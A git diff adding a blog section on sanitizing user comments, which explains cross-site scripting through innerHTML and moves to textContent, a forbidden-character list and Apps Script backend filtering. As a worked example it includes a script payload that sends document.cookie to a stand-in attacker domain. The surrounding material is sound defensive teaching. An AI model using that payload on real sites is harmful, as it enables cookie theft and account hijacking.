@@ -86,12 +86,100 @@
 
     </div>
 
+    <div class="card card-body mb-3 mt-3">
+      <h2>User Input Sanitization</h2>
+      <p>Your system users may not always write to you with the best intentions. Not only can they send you a mean message, but they might also include a malicious piece of code.</p>
+      <p>Imagine if someone writes a comment on my blog that includes an HTML tag containing JavaScript code. This comment will be displayed as part of my blog page. A browser could potentially interpret that comment as additional front-end code to be executed—and that’s where the danger lies.</p>
+      <p>Take a look at the code below. Note that a comment has been added into a comment section using <code>innerHTML</code> :</p>
+      <pre class="language-javascript"><code>
+const commentSection = document.getElementById("commentSection");
+commentSection.innerHTML += `&lt;div&gt;"${comment}"&lt;/div&gt;`;
+      </code></pre>
+      <p>What if the content of comment is:</p>
+      <pre><code>
+&lt;script&gt;fetch('https://attackerDomain5050.com?c=' + document.cookie)&lt;/script&gt;
+      </code></pre>
+      <p>In this case, any user who accesses a page with this comment risks having their cookies stolen. Since the content is inserted via <code>innerHTML</code>, the browser interprets it as executable front-end code. This is just one example of many possible threats.</p>
+      <p>That is why I now display comments on my page using this approach:</p>
+      <pre class="language-javascript"><code>
+const commentElement = document.createElement("div");
+commentElement.textContent = comment;
+const commentSection = document.getElementById("commentSection");
+commentSection.appendChild(commentElement);
+      </code></pre>
+
+      <p>By using textContent, even if the comment includes code, the browser treats it as plain text—not executable code.</p>
+
+      <p>But that’s not all.</p>
+
+      <p>Maybe I could stop here, but an important concept in security—called redundancy—states that I should implement multiple layers of protection, so that if one outer layer fails, the next one provides backup.</p>
+
+      <p>With that in mind, I’ve decided to block certain characters in the comment form:</p>
+
+      <pre><code>
+< > " ' / \ = ( ) { } [ ] ; : @ & + % # $ `
+      </code></pre>
+
+      <p>You can write them in the name and text area of the form, but when you click "Post," a message will appear saying that your comment or name contains forbidden characters. The frontend will then refuse to send your message to the “database.” Without these characters, it becomes much harder to inject code into the comment section.</p>
+
+      <p>Some of these characters are blocked not just for script injection, but also to protect the database itself. I’m using a Google Spreadsheet as a database—it’s public information, and anyone following my blog posts knows about it. To prevent a clever user from submitting a comment that contains a Google Sheets formula (which could tamper with the database), I’m filtering out those characters on the frontend.</p>
+
+      <p>And in case someone bypasses that, I’m also checking for those characters in the API code on the backend.</p>
+    
+      <p>My App Script code for now</p>
+
+      <pre class="language-javascript"><code>
+function doGet(e) {
+  // check for new comments mails to add to the spreadSheet
+  const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+  const threads = GmailApp.search('subject:blog_comment is:unread');
+
+  const forbiddenChars = /[<>"'\/\\=\(\)\{\}\[\];:@&+%#$`]/;
+
+  threads.forEach(thread => {
+    const messages = thread.getMessages();
+    messages.forEach(msg => {
+      const name = msg.getFrom().split(' <')[0];
+      const [postId, message] = msg.getPlainBody().split("###end###");
+      // checking and blogcking messages and names with forbidden characters
+      if (!forbiddenChars.test(name) && !forbiddenChars.test(message)){
+        sheet.appendRow([postId, name, message]);
+      }
+    });
+    thread.markRead(); 
+  });
+
+  //returing the data as a json
+  const data = sheet.getDataRange().getValues();
+  const postId = e.parameter['post_id'];
+  //const postId = "2";
+  const filtered_data = data.filter(row => String(row[0]) === String(postId));
+  //console.log(filtered_data);
+
+  var jsonData = [];
+  for (var i = 0; i < filtered_data.length; i++) {
+    jsonData.push({
+      PostId: filtered_data[i][0],
+      Name: filtered_data[i][1],
+      Message: filtered_data[i][2]
+    });
+  }
+  //console.log(jsonData);
+  return ContentService.createTextOutput(JSON.stringify(jsonData))
+    .setMimeType(ContentService.MimeType.JSON);
+  
+}
+
+      </code></pre>
+    
+    </div>
+
 
     <form class="card card-body mb-3" id="comment-form">
       <h6 class="mb-3 text-muted">Leave a comment</h6>
       <div class="mb-2">
         <input type="text" name="name" class="form-control form-control-sm border-0 border-bottom rounded-0 bg-transparent" 
-          id="name" placeholder="Name" value="12" required>
+          id="name" placeholder="Name" required>
       </div>
       <div class="mb-2">
         <textarea name="message" class="form-control form-control-sm border-0 border-bottom rounded-0 bg-transparent" 
